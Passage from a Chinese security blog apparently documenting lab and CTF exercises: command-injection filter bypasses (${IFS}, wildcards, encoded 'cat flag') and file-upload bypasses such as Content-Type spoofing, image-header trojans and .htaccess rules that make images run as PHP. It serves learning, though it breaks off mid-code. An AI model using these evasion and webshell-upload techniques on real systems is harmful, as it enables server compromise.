<p><img src="D:\blog\H01iday\source_posts\pics\exec2.png" alt="exec2"></p>
<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><ol>
<li>${IFS}</li>
<li><code>%09</code>(需要PHP环境）</li>
<li>重定向符&lt;、&lt;&gt;</li>
</ol>
<p><img src="D:\blog\H01iday\source_posts\pics\exec4.png" alt="exec4"></p>
<img src="D:\blog\H01iday\source\_posts\pics\exec3.png" alt="exec4" style="zoom:50%;" />





<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="过滤cat-flag"><a href="#过滤cat-flag" class="headerlink" title="过滤cat/flag"></a>过滤cat/flag</h3><ol>
<li><p>变量拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# a=ca;b=t;c=flag;$a$b $c</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li>
<li><p>单引号，双引号绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# ca&quot;&quot;t flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li>
<li><p>编码绕过[下面为16进制编码]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;) ==&gt;等于执行ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;) ==&gt;等于执行cat flag</span><br></pre></td></tr></table></figure></li>
<li><p>读文件绕过(当cat被过滤)</p>
<p>more 一页一页的显示档案内容</p>
<p>head -n filename 查看头几行</p>
<p>tail -n filename 查看尾几行</p>
<p>nl：显示的时候，顺便输出行号</p>
<p>od:以二进制的方式读取档案内容</p>
</li>
<li><p>反斜线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# ca\t fl\ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li>
<li><p><code>$1、$2等和$@</code></p>
<p>$1~$n本身的意思是添加到shell的各参数值</p>
<p>$@的意思是$1~$n的所有参数列表</p>
<p>这里可以用作占位符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# ca$1t fl$1ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><p>前面要加/???/</p>
<p><code>?</code>代表一个字符</p>
<p><code>*</code>代表一串字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# /???/ca? fl*</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>



<h2 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h2><p>`command`和$(command)都是执行命令的方式</p>
<p>和变量替换类似。先执行引号中的内容，再将command中的内容执行替换到引号中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# echo &quot;files are: $(ls)&quot;</span><br><span class="line">files are: 01.php</span><br><span class="line">02.php</span><br><span class="line">03.php</span><br><span class="line">04.php</span><br><span class="line">05.php</span><br><span class="line"></span><br><span class="line">[root@bc23a49cb37c exec]# echo &quot;files are: `ls`&quot;</span><br><span class="line">files are: 01.php</span><br><span class="line">02.php</span><br><span class="line">03.php</span><br><span class="line">04.php</span><br><span class="line">05.php</span><br></pre></td></tr></table></figure>



<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br><span class="line">you are good!</span><br><span class="line">[root@bc23a49cb37c exec]# $(echo &quot;Y2F0IGZsYWc=&quot;|base64 -d)</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>



<h2 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h2><p>换行执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# ca\</span><br><span class="line">&gt; t\</span><br><span class="line">&gt;  fl\</span><br><span class="line">&gt; ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>

<p>写一个多行的文件来执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# echo &quot;ca\\&quot;&gt;shell</span><br><span class="line">[root@bc23a49cb37c exec]# echo &quot;t\\&quot;&gt;&gt;shell</span><br><span class="line">[root@bc23a49cb37c exec]# echo &quot; fl\\&quot;&gt;&gt;shell</span><br><span class="line">[root@bc23a49cb37c exec]# echo &quot;ag&quot;&gt;&gt;shell</span><br><span class="line">[root@bc23a49cb37c exec]# cat shell</span><br><span class="line">ca\</span><br><span class="line">t\</span><br><span class="line"> fl\</span><br><span class="line">ag</span><br><span class="line">[root@bc23a49cb37c exec]# sh shell</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>





<p>一个神奇的栗子：</p>
<p>注意ls -t是按照事件顺序排列，后创建的排前面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# mkdir folder</span><br><span class="line">[root@bc23a49cb37c exec]# cd folder</span><br><span class="line">[root@bc23a49cb37c folder]# &gt;&quot;ag&quot;</span><br><span class="line">[root@bc23a49cb37c folder]# &gt;&quot;fl\\&quot;</span><br><span class="line">[root@bc23a49cb37c folder]# &gt;&quot;t \\&quot;</span><br><span class="line">[root@bc23a49cb37c folder]# &gt;&quot;ca\\&quot;</span><br><span class="line"></span><br><span class="line">[root@bc23a49cb37c folder]# ls -t</span><br><span class="line">ca\  t \  fl\  ag</span><br><span class="line"></span><br><span class="line">[root@bc23a49cb37c folder]# ls -t&gt;aaa</span><br><span class="line">[root@bc23a49cb37c folder]# cat aaa</span><br><span class="line">aaa</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag</span><br><span class="line"></span><br><span class="line">[root@bc23a49cb37c folder]# sh aaa</span><br><span class="line">aaa: line 1: aaa: command not found</span><br><span class="line">you are goooood!</span><br></pre></td></tr></table></figure>



<h2 id="Useful-commands"><a href="#Useful-commands" class="headerlink" title="Useful commands"></a>Useful commands</h2><table>
<thead>
<tr>
<th align="left">Purpose of command</th>
<th align="left">Linux</th>
<th align="left">Windows</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Name of current user</td>
<td align="left"><code>whoami</code></td>
<td align="left"><code>whoami</code></td>
</tr>
<tr>
<td align="left">Operating system</td>
<td align="left"><code>uname -a</code></td>
<td align="left"><code>ver</code></td>
</tr>
<tr>
<td align="left">Network configuration</td>
<td align="left"><code>ifconfig</code></td>
<td align="left"><code>ipconfig /all</code></td>
</tr>
<tr>
<td align="left">Network connections</td>
<td align="left"><code>netstat -an</code></td>
<td align="left"><code>netstat -an</code></td>
</tr>
<tr>
<td align="left">Running processes</td>
<td align="left"><code>ps -ef</code></td>
<td align="left"><code>tasklist</code></td>
</tr>
</tbody></table>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/27/iwebsec/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/27/iwebsec/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-27 21:10:59" itemprop="dateCreated datePublished" datetime="2021-09-27T21:10:59+08:00">2021-09-27</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-09 11:41:15" itemprop="dateModified" datetime="2021-10-09T11:41:15+08:00">2021-10-09</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>文件上传漏洞</p>
<h3 id="01-前端JS过滤绕过"><a href="#01-前端JS过滤绕过" class="headerlink" title="01-前端JS过滤绕过"></a>01-前端JS过滤绕过</h3><h4 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a><strong>问题描述：</strong></h4><p>先通过图中方法找到源码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload1.png" alt="upload1"></p>
<p>相当于设定文件后缀名的白名单，通过js进行验证</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload2.png"></p>
<h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h4><p>上传一个php文件，即实现js绕过</p>
<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><h5 id="①使用burp-suite代理"><a href="#①使用burp-suite代理" class="headerlink" title="①使用burp suite代理"></a><strong>①使用burp suite代理</strong></h5><p>​            先选择一个符合上传要求的文件，并点击上传</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload3.png" style="zoom:67%;" />

<p>​            将burp suite拦截的数据包，filename改为要上传的php文件名</p>
<p>​                            <img src="D:\blog\H01iday\source\_posts\pics\upload4.png"  /></p>
<p>​            成功上传php文件</p>
<p>​                        <img src="D:\blog\H01iday\source\_posts\pics\upload5.png" style="zoom:67%;" /></p>
<h5 id="②onsubmit事件"><a href="#②onsubmit事件" class="headerlink" title="②onsubmit事件"></a><strong>②onsubmit事件</strong></h5><p>​            这个地方改为return true， checkFile本来是用于校验文件后缀名的函数，这样做其实就是不让它运行校验的函数</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload6.png" alt="upload6"></p>
<p>​        <img src="D:\blog\H01iday\source\_posts\pics\upload7.png" alt="upload6" style="zoom:80%;" /></p>
<p>【这种方法的局限性：1. 不同的浏览器处理监听事件有区别。这种方式[onsubmit=”return true”]在火狐浏览器上可行，在chrome却不行，需要用其他方式。2. 直接修改html源码，js代码[如在此白名单添加.php]是不可行的，因为其实js在刷新页面的时候大部分已经执行完，除了少数例如这里的onsubmit等需要被触发的事件未执行。所以添加.php没用，因为那个部分的js代码已经被执行完并加载到内存中，要执行新的就必须刷新页面，而刷新页面服务器会发送过来新的js代码覆盖本地的js，所以在F12修改只有少部分需要触发的事件函数对应的内容有效。】</p>
<p><strong>这里演示chrome如何绕过</strong></p>
<p>​        从图中可以看出在chrome上述方法没用</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload8.png" alt="upload6" style="zoom:70%;" />



<p>这里的做法是，在form表单上先将onsubmit值修改为“return true”  </p>
<p>右键选择duplicate element复制元素 生成一个一样的新的元素</p>
<p>然后将原form元素删除</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload9.png" alt="upload9" style="zoom:80%;" />

<p>php文件上传成功</p>
<p>原理可能是原form在页面加载时被绑定了【具体的原理需要了解不同内核浏览器对监听事件的处理】</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload10.png" alt="upload10" style="zoom:67%;" />



<h5 id="③禁用浏览器JS"><a href="#③禁用浏览器JS" class="headerlink" title="③禁用浏览器JS"></a><strong>③禁用浏览器JS</strong></h5><p><strong>【不同浏览器设置方法不同，这里以firefox为例】</strong></p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload11.png" alt="upload11"></p>
<p>​        经过上面的设置之后，js代码不会再被执行</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload10.png" alt="upload10" style="zoom:67%;" />

<h5 id="④删除事件侦听器"><a href="#④删除事件侦听器" class="headerlink" title="④删除事件侦听器"></a><strong>④删除事件侦听器</strong></h5><img src="D:\blog\H01iday\source\_posts\pics\upload12.png" alt="upload12" style="zoom:80%;" />

<img src="D:\blog\H01iday\source\_posts\pics\upload10.png" alt="upload10" style="zoom: 67%;" />



<h3 id="02文件名过滤绕过"><a href="#02文件名过滤绕过" class="headerlink" title="02文件名过滤绕过"></a>02文件名过滤绕过</h3><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>​    获取文件的后缀名  看和’php’字符串是否相匹配</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload41.png" alt="upload41"></p>
<h4 id="目标：-1"><a href="#目标：-1" class="headerlink" title="目标："></a>目标：</h4><p>上传php文件</p>
<h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​    这种比较简单，上传个Php、PHP用大小写绕过即可</p>
<h3 id="03Content-Type过滤绕过"><a href="#03Content-Type过滤绕过" class="headerlink" title="03Content-Type过滤绕过"></a>03Content-Type过滤绕过</h3><h4 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h4><p>​    Content-Type(MIME)是什么：用于定义网络文件的类型和网页的编码，用来告诉文件接收方将以什么形式、 什么编码读取这个文件。</p>
<p>​    Content-type常见类型</p>
<p>​        jpg文件的Content-Type为image/jpeg</p>
<p>​        php文 件的Content-Type为application/octet-stream</p>
<h4 id="问题描述：-1"><a href="#问题描述：-1" class="headerlink" title="问题描述："></a>问题描述：</h4><p>​    通过判断type是否为application/octet-stream来判断是否上传的文件是否为php类型</p>
<p>​    <img src="D:\blog\H01iday\source_posts\pics\upload42.png" alt="upload41"></p>
<h4 id="目标：-2"><a href="#目标：-2" class="headerlink" title="目标："></a>目标：</h4><p>​    上传php文件</p>
<h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​    这也也比较简单，直接burp拦截修改content-type即可</p>
<h3 id="04文件头过滤绕过"><a href="#04文件头过滤绕过" class="headerlink" title="04文件头过滤绕过"></a>04文件头过滤绕过</h3><h4 id="基础知识：-1"><a href="#基础知识：-1" class="headerlink" title="基础知识："></a><strong>基础知识：</strong></h4><p>很多文件都有文件头【在文件内容的最开头处】，且不同文件的文件头不一样。</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>文件头</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG (jpg)</td>
<td>FFD8FF</td>
</tr>
<tr>
<td>GIF (gif)</td>
<td>47 49 46 38 39 61 （GIF89a）</td>
</tr>
<tr>
<td>PNG (png)</td>
<td>89504E470D0A1A0A</td>
</tr>
<tr>
<td>HTML (html)</td>
<td>68746D6C3E</td>
</tr>
<tr>
<td>XML (xml)</td>
<td>3C3F786D6C</td>
</tr>
</tbody></table>
<p>例：</p>
<p>某html文件的文件头</p>
<p><img src="D:\blog\H01iday\source_posts\pics\html文件头.png"></p>
<p>某png文件的文件头</p>
<p><img src="D:\blog\H01iday\source_posts\pics\png文件头.png" alt="html文件头"></p>
<p>利用</p>
<p><strong>exif_imagetype(filename)判断一个图像的类型</strong></p>
<p><strong>通过读取一个图像的第一个字节</strong>并检查其签名</p>
<p>如果filename对应的文件是图像类型，则返回对应类型的常量。如IMAGETYPE_GIF</p>
<p>如果不是图像类型返回false</p>
<p><strong>cmd copy命令合并文件</strong></p>
<p>将文本文件合并到一个非文本文件[要隐藏001.txt文件]</p>
<p><code>copy 002.jpg/b + 001.txt/a 003.jpg</code></p>
<p>/b指定以二进制格式复制合并文件，/a指定以ASCII格式复制合并文件</p>
<p>二进制文件放在<code>+</code>前，文本文件放在<code>+</code>后，生成的文件命名为003.jpg</p>
<p>将多个同类型的文件拼接在一起</p>
<p><code>copy /b &lt;filename1&gt;+&lt;filename2&gt;+...+&lt;filenameN&gt;</code></p>
<p>例：</p>
<p>copy /b video1.mpg+video2.mpg video.mpg</p>
<h4 id="问题描述：-2"><a href="#问题描述：-2" class="headerlink" title="问题描述："></a><strong>问题描述：</strong></h4><p><img src="D:\blog\H01iday\source_posts\pics\upload13.png" alt="upload13"></p>
<p>​            该网页只允许上传图片文件，该网页使用**exif_imagetype(filename)**函数即读取上传文件文件头的方式判断文件的类型。</p>
<h4 id="目标：-3"><a href="#目标：-3" class="headerlink" title="目标："></a>目标：</h4><p>上传一个php文件</p>
<h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​        </p>
<h5 id="①修改-添加文件头"><a href="#①修改-添加文件头" class="headerlink" title="①修改/添加文件头"></a>①修改/添加文件头</h5><p>​        <img src="file:///C:\Users\86176\AppData\Roaming\Tencent\Users\2791454066\QQ\WinTemp\RichOle\HI96AJ14XD95P8GBPAV9KQG.png" alt="img">        </p>
<p>直接上传不成功</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload24.png" alt="upload24" style="zoom:67%;" />

<p>在文件前面添加图片文件的文件头即可</p>
<p>​        <img src="D:\blog\H01iday\source\_posts\pics\upload25.png" alt="upload25" style="zoom:67%;" /></p>
<h5 id="②制作图片木马"><a href="#②制作图片木马" class="headerlink" title="②制作图片木马"></a>②制作图片木马</h5><p>​        制作文件木马<img src="D:\blog\H01iday\source_posts\pics\upload26.png"></p>
<p>打开final.php文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload27.png" alt="upload26"></p>
<p>图片文件在前面，都是乱码，到最后才是1.php文件的内容</p>
<p><strong>能够上传成功 原因在于完整的png文件都是以89504e(hex)开头，以426082(hex)结尾，浏览器会忽略426082的内容，因此可以在png文件之后添加其它文件内容。</strong></p>
<img src="D:\blog\H01iday\source\_posts\pics\upload28.png" alt="upload26" style="zoom:67%;" />



<h3 id="05-htaccess文件上传"><a href="#05-htaccess文件上传" class="headerlink" title="05.htaccess文件上传"></a>05.htaccess文件上传</h3><h4 id="基础知识：-2"><a href="#基础知识：-2" class="headerlink" title="基础知识："></a>基础知识：</h4><ul>
<li><p>.htaccess文件 (或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。</p>
</li>
<li><p>.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的</p>
</li>
<li><p>.htaccess可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档、文件的跳转等功能。</p>
</li>
<li><p><strong>.htaccess 文件上传漏洞原理：</strong>一般.htaccess可以用来留后门和针对黑名单绕过</p>
<ol>
<li><p>创建一个txt写入<code>AddType application/x-httpd-php .png </code>  命名为： .htaccess</p>
<p>这种方式可以让 png文件 解析为 php </p>
</li>
<li><p>把文件名包含1的解析成php   1.png   hell10.jpg等文件都会解析成php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>preg_match(string pattern, string subjuect)函数</p>
<p>执行一个正则表达式，查看字符串subject中是否有满足pattern要求的内容</p>
<p>pattern：要匹配的正则表达式</p>
<p>subject：查找的字符串</p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;查找到匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未发现匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>正则表达式的一些内容：</p>
<p>“/”是表达式开始和结束的标志</p>
<p>“i”代表不区分大小写 例：/abc/i可以匹配AbC等</p>
</li>
</ul>
<h4 id="问题描述：-3"><a href="#问题描述：-3" class="headerlink" title="问题描述："></a>问题描述：</h4><p>使用php函数preg_match来判断文件类型，无法像上面绕过，只能从文件本身下手</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload29.png" alt="upload29"></p>
<h4 id="目标：-4"><a href="#目标：-4" class="headerlink" title="目标："></a>目标：</h4><p>​    上传php文件</p>
<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><p>​    我们可以利用htaccess文件的特性</p>
<p>​    将植入恶意代码的php文件后缀名[例：hack.php]进行更改，如改成gif等[hack.gif]</p>
<p>​    然后通过上传<code>.htaccess</code>文件</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload31.png" alt="upload30" style="zoom:80%;" />

<p>​    <code>.htaccess</code>文件里面内容编写：<code>AddType application/x-httpd-php .png</code>  使得png文件可以通过php方式解析</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload30.png" alt="upload30" style="zoom:67%;" />

<p>​    或者设定  只对该hack.gif文件进行特殊处理 以免系统处理混乱</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;hack&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>​    最后上传hack.gif文件  发现能够顺利上传，且按照php方式执行</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload32.png" alt="upload30" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\upload33.png" alt="upload30" style="zoom:50%;" />



<h3 id="06文件截断上传"><a href="#06文件截断上传" class="headerlink" title="06文件截断上传"></a>06文件截断上传</h3><h4 id="基础知识：-3"><a href="#基础知识：-3" class="headerlink" title="基础知识："></a>基础知识：</h4><p><strong>::$DATA</strong></p>
<p>​        在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p>
<p>例如:<code>&quot;phpinfo.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;phpinfo.php&quot;</code></p>
<p>hack.php::$DATA</p>
<p><strong>php函数  uniqid()</strong></p>
<p>以微秒计的当前时间，生成一个唯一的 ID</p>
<p><strong>enctype</strong></p>
<p>当 <code>method</code> 属性值为 <code>post</code> 时，<code>enctype</code> 就是将表单的内容提交给服务器的 <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Mime_type">MIME 类型</a> 。可能的取值有：</p>
<ul>
<li><p><code>application/x-www-form-urlencoded</code>：enctype默认值。</p>
<p>​                                                                        不能用于上传文件，只能提交文本，如果有file控件的话也只能提交文件名</p>
<p>​                                                                        只能上传键值对，并且键值对都是间隔分开的。</p>
<p>​                                                                        在发送前对所有字符进行编码</p>
<p>​                                                                    </p>
</li>
<li><p><code>multipart/form-data</code>：当表单包含 <code>type=file</code> 的元素时使用此值。</p>
<p>​                                            不对字符编码。</p>
<p>​                                            既可以上传文件等二进制数据，也可以上传表单键值对，只是最后会转化为一条信息；</p>
</li>
<li><p><code>text/plain</code>：出现于 HTML5，用于调试。将空格转换为 “+” 符号，但不编码特殊字符。</p>
</li>
</ul>
<p><strong>00截断分析</strong></p>
<ol>
<li><p>原理：0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
</li>
<li><p>限制条件：PHP&lt;5.3.29，且GPC关闭</p>
</li>
<li><p>```php<br>$uploaded_name = $_FILES[ ‘file’ ][ ‘name’ ];<br>$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, ‘.’ ) + 1); // 提取上传文件后缀<br>$target_name = md5( uniqid().$uploaded_name ).’.’.$uploaded_ext; // 对上传文件进行重命名<br>if( ( strtolower( $uploaded_ext ) == “jpg” || strtolower( $uploaded_ext ) == “jpeg” || strtolower( $uploaded_ext ) == “png” ))<br>{  </p>
<pre><code>move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir.$target_name); // 将临时文件移动到指定目录
$result = $dir . $target_name;
echo &quot;Stored in: $result&quot;; 
</code></pre>
<p>}<br>else{</p>
<pre><code>echo &quot;Invalid file&quot;;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 问题描述：</span><br><span class="line"></span><br><span class="line">通过截取文件的后缀名，判断是否图片文件，如果是才允许上传</span><br><span class="line"></span><br><span class="line">![upload34](D:\blog\H01iday\source\_posts\pics\upload34.png)</span><br><span class="line"></span><br><span class="line">#### 目标：</span><br><span class="line"></span><br><span class="line">​		成功上传php文件</span><br><span class="line"></span><br><span 